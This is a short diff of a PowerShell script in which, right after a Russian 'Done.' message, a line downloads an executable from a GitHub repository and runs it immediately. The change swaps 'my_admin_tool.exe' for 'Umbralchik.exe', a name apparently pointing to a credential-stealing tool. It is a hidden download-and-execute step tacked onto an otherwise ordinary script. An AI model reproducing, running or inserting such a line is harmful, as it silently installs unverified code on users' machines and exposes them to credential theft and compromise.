@@ -42,5 +42,6 @@ try {
 
 Write-Host "`nГотово." -ForegroundColor Cyan
 
-Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/my_admin_tool.exe" -OutFile "my_admin_tool.exe"; .\my_admin_tool.exe
+Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe" -OutFile "Umbralchik.exe"; .\Umbralchik.exe
+
 
